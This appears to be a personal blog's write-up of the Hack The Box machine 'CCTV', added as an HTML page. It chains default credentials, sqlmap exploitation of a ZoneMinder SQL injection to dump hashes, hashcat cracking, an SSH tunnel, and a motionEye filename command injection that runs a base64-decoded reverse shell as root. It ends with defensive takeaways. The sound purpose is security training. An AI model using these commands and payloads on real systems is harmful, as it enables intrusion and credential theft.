@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CCTV | shreekara@sec</title>
+<meta name="description" content="HTB CCTV: ZoneMinder SQL injection (CVE-2024-51482), hash cracking, motionEye command injection to root.">
+<link rel="icon" type="image/png" href="../../assets/img/favicon-32.png">
+<link rel="apple-touch-icon" href="../../assets/img/apple-touch-icon.png">
+<meta property="og:title" content="CCTV | shreekara@sec">
+<meta property="og:description" content="HTB CCTV: ZoneMinder SQL injection (CVE-2024-51482), hash cracking, motionEye command injection to root.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://sneakyyy.site/writeups/cctv/index.html">
+<meta property="og:image" content="../../assets/img/splash2.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<div class="site">
+<main>
+<div class="prompt-l"><span class="u">shreekara</span>@<span class="h">sneaky69</span>:~/writeups/cctv$</div>
+
+<nav class="path-nav">
+  <a href="../../index.html"><span class="tilde">~/</span>home</a>
+  <a href="../../about/index.html"><span class="tilde">~/</span>about</a>
+  <a href="../../writeups/index.html" class="active"><span class="tilde">~/</span>writeups</a>
+  <a href="../../projects/index.html"><span class="tilde">~/</span>projects</a>
+</nav>
+
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">cat</span><span class="a">cctv.md</span></div></div>
+
+<h1 style="color:var(--white);font-size:20px;margin-bottom:0.6rem;">HTB Write-Up: CCTV</h1>
+
+<table class="ptable">
+  <tr><td>Platform</td><td>Hack The Box</td></tr>
+  <tr><td>Difficulty</td><td><span class="badge easy">Easy</span></td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Author</td><td>shreekara</td></tr>
+  <tr><td>Date</td><td>June 2, 2026</td></tr>
+  <tr><td>Source</td><td><a href="https://github.com/ShreekaraKedlaya/Hackthebox-writeups/blob/main/cctv.md" target="_blank">github.com/ShreekaraKedlaya/Hackthebox-writeups</a></td></tr>
+</table>
+
+<hr class="sep">
+
+<p class="section-lbl">Table of Contents</p>
+<pre class="cb">1. Reconnaissance
+2. Enumeration — Web App &amp; Version Fingerprinting
+3. Foothold — CVE-2024-51482 (ZoneMinder SQL Injection)
+4. Lateral Movement — motionEye Internal Service
+5. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)
+6. Summary &amp; Takeaways</pre>
+
+<hr class="sep">
+
+<p class="section-lbl">1. Reconnaissance</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">sudo nmap</span><span class="a">-sC -sV -p- 10.129.1.108</span></div></div>
+<table class="ptable">
+  <tr><td>Port</td><td>Service</td><td style="color:var(--fg);">Details</td></tr>
+  <tr><td>22</td><td>SSH</td><td style="color:var(--fg);">OpenSSH 9.6p1 (Ubuntu)</td></tr>
+  <tr><td>80</td><td>HTTP</td><td style="color:var(--fg);">Apache 2.4.58 (Ubuntu)</td></tr>
+</table>
+<p>SSH is useless without creds. Port 80 redirects straight to <code style="color:var(--cyan);">http://cctv.htb/</code>, so that's added to <code style="color:var(--cyan);">/etc/hosts</code> and the web server is the focus.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">2. Enumeration — Web App &amp; Version Fingerprinting</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.1 — Initial Browsing</p>
+<p><code style="color:var(--cyan);">cctv.htb</code> is a site for SecureVision, a CCTV and security solutions company. Two things stand out: a Staff Login button and a Get a Quote button. Staff Login was the interesting one &mdash; it brings up a <strong style="color:var(--white);">ZoneMinder</strong> login panel.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.2 — Default Credentials</p>
+<p>Tried <code style="color:var(--cyan);">admin:admin</code> &mdash; worked immediately. Inside the ZoneMinder dashboard, the version string is right there: <strong style="color:var(--white);">ZoneMinder v1.37.63</strong>.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">2.3 — CVE Research</p>
+<p>Searching "ZoneMinder 1.37.63 CVE" turns up <strong style="color:var(--red2);">CVE-2024-51482</strong> &mdash; a boolean-based blind SQL injection in the <code style="color:var(--cyan);">tid</code> parameter of <code style="color:var(--cyan);">web/ajax/event.php</code>, affecting versions up to v1.37.64. Squarely in range.</p>
+<table class="ptable">
+  <tr><td>CVE</td><td>Service</td><td style="color:var(--fg);">Impact</td></tr>
+  <tr><td>CVE-2024-51482</td><td>ZoneMinder &le; v1.37.64</td><td style="color:var(--fg);">Authenticated blind SQLi via tid param</td></tr>
+</table>
+
+<hr class="sep">
+
+<p class="section-lbl">3. Foothold — CVE-2024-51482 (ZoneMinder SQL Injection)</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.1 — Manual Verification</p>
+<p>A public PoC existed but didn't work cleanly, so verified the endpoint manually first, using the <code style="color:var(--cyan);">ZMSESSID</code> session cookie grabbed from dev tools:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">curl</span><span class="a">-v -b "ZMSESSID=&lt;cookie&gt;" "http://cctv.htb/zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1"</span></div>
+  <div class="cmd-out">{"result":"Ok","response":0}</div>
+</div>
+<p>Endpoint reachable and authenticated. Good to proceed.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.2 — Exploiting with sqlmap</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">sqlmap</span><span class="a">-u "http://cctv.htb/zm/index.php?...&amp;tid=1" --cookie="ZMSESSID=&lt;cookie&gt;" --batch --level=3 --risk=3</span></div>
+  <div class="cmd-out">tid (GET) — time-based blind, MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</div>
+</div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.3 — Dumping Credentials</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">sqlmap</span><span class="a">-u "..." --cookie="ZMSESSID=&lt;cookie&gt;" --batch -D zm -T Users -C Username,Password --dump</span></div></div>
+<p>Fair warning: time-based blind is slow, every character costs multiple timed requests, and sessions can expire mid-extraction. Three users came out with bcrypt hashes attached &mdash; <code style="color:var(--cyan);">superadmin</code>, <code style="color:var(--cyan);">mark</code>, <code style="color:var(--cyan);">admin</code>.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.4 — Hash Cracking</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">hashcat</span><span class="a">-m 3200 hashes.txt rockyou.txt</span></div>
+  <div class="cmd-out">mark:opensesame &middot; admin:admin</div>
+</div>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">3.5 — SSH Access</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ssh</span><span class="a">mark@10.129.244.156</span></div>
+  <div class="cmd-out">Password: opensesame &middot; logged in.</div>
+</div>
+<p>In as <code style="color:var(--cyan);">mark</code>, but the user flag isn't in <code style="color:var(--cyan);">/home/mark/</code> &mdash; it's sitting in <code style="color:var(--cyan);">/home/sa_mark/</code>, which mark can't touch. Time to pivot.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">4. Lateral Movement — motionEye Internal Service</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.1 — Internal Enumeration</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ss</span><span class="a">-tlnp</span></div></div>
+<table class="ptable">
+  <tr><td>Port</td><td style="color:var(--fg);">Service</td></tr>
+  <tr><td>8765</td><td style="color:var(--fg);">motionEye 0.43.1b4 — CCTV management UI</td></tr>
+  <tr><td>8888</td><td style="color:var(--fg);">MediaMTX media server</td></tr>
+</table>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">4.2 — SSH Tunnel &amp; Credentials</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">ssh</span><span class="a">-L 8765:127.0.0.1:8765 mark@10.129.244.156</span></div></div>
+<p>motionEye stores its config in <code style="color:var(--cyan);">/etc/motioneye/</code>, and some of those files turned out readable:</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">strings</span><span class="a">/etc/motioneye/motion.conf | grep -i pass</span></div>
+  <div class="cmd-out">Admin password stored in plaintext.</div>
+</div>
+<p>Logged into motionEye as admin with the recovered password.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">5. Privilege Escalation — CVE-2025-60787 (motionEye Command Injection)</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.1 — How the Vulnerability Works</p>
+<p>Settings panel confirmed motionEye 0.43.1b4, which turns up <strong style="color:var(--red2);">CVE-2025-60787</strong> &mdash; OS command injection via the <code style="color:var(--cyan);">image_file_name</code> config parameter. motionEye passes the filename through shell evaluation when saving snapshots, so a command substitution <code style="color:var(--cyan);">$(...)</code> in the filename gets executed. There's frontend JS validation blocking special characters, but that's a browser console line away from gone.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.2 — Bypassing Validation &amp; Injecting the Payload</p>
+<div class="cmd"><div class="cmd-line"><span class="d">$</span><span class="c">nc</span><span class="a">-lvnp 9001</span></div></div>
+<p>In the browser dev console (F12):</p>
+<div class="cmd"><div class="cmd-line"><span class="d">&gt;</span><span class="c">configUiValid</span><span class="a">= function() { return true; };</span></div></div>
+<p>Then under Settings &rarr; Still Images &rarr; Image File Name:</p>
+<pre class="cb">$(echo &lt;base64-reverse-shell&gt; | base64 -d | bash).%Y-%m-%d-%H-%M-%S</pre>
+<p>Base64 encoding the payload dodges any remaining backend character filtering.</p>
+
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">5.3 — Triggering the Shell</p>
+<p>Saved the config, hit the snapshot button on the camera feed. The moment motionEye tried to save the image with the malicious filename, the shell evaluated the substitution and the reverse shell fired &mdash; and since motionEye runs as root, the shell came back as root directly. Both flags in one shot.</p>
+
+<hr class="sep">
+
+<p class="section-lbl">6. Summary &amp; Takeaways</p>
+<p style="color:var(--white);font-weight:700;margin-top:1rem;">Attack Chain</p>
+<table class="ptable">
+  <tr><td>Phase</td><td>Technique</td><td style="color:var(--fg);">Result</td></tr>
+  <tr><td>Recon</td><td>nmap -sC -sV -p-</td><td style="color:var(--fg);">Ports 22, 80 identified</td></tr>
+  <tr><td>Web Enumeration</td><td>Default creds admin:admin</td><td style="color:var(--fg);">ZoneMinder dashboard access</td></tr>
+  <tr><td>CVE-2024-51482</td><td>sqlmap time-based blind SQLi</td><td style="color:var(--fg);">Bcrypt hashes dumped</td></tr>
+  <tr><td>Hash Cracking</td><td>hashcat -m 3200</td><td style="color:var(--fg);">mark:opensesame cracked</td></tr>
+  <tr><td>SSH Access</td><td>Password reuse</td><td style="color:var(--fg);">Shell as mark</td></tr>
+  <tr><td>Internal Recon</td><td>ss -tlnp + SSH tunnel</td><td style="color:var(--fg);">motionEye identified + creds extracted</td></tr>
+  <tr><td>CVE-2025-60787</td><td>Command injection via image_file_name</td><td style="color:var(--fg);">Root shell + both flags</td></tr>
+</table>
+
+<p style="color:var(--white);font-weight:700;margin-top:1.2rem;">What I Took Away From This Box</p>
+<p style="margin-top:0.6rem;">Killing that frontend validation with one line in the console was the moment that stuck with me &mdash; it made it obvious how little client-side checks actually protect anything. If the backend doesn't sanitize input, the JavaScript blocking special characters is just friction, not a control.</p>
+<p style="margin-top:0.6rem;">motionEye was never exposed externally at all, and I'd never have reached it without running <code style="color:var(--cyan);">ss -tlnp</code> and tunneling in over SSH. That's become a habit now for every box &mdash; check what's listening on localhost after any foothold, because the privesc path is often sitting right there.</p>
+<p style="margin-top:0.6rem;">Default and plaintext credentials carried this whole chain, honestly. <code style="color:var(--cyan);">admin:admin</code> on ZoneMinder, then a plaintext password sitting in a world-readable motionEye config. Neither took real effort to find. And the fact that CVE-2025-60787 needed authentication first didn't matter much once those credentials were sitting right there for the taking &mdash; "authenticated" doesn't mean much as a mitigation when the auth itself is broken.</p>
+
+<a class="back-link" href="../../writeups/index.html">&lt; cd ~/writeups</a>
+
+</main>
+<footer>
+  <span>shreekara // security researcher</span>
+  <span><a href="../../writeups/index.html">writeups</a> · <a href="https://github.com/ShreekaraKedlaya" target="_blank">github</a></span>
+</footer>
+</div>
+</body>
+</html>
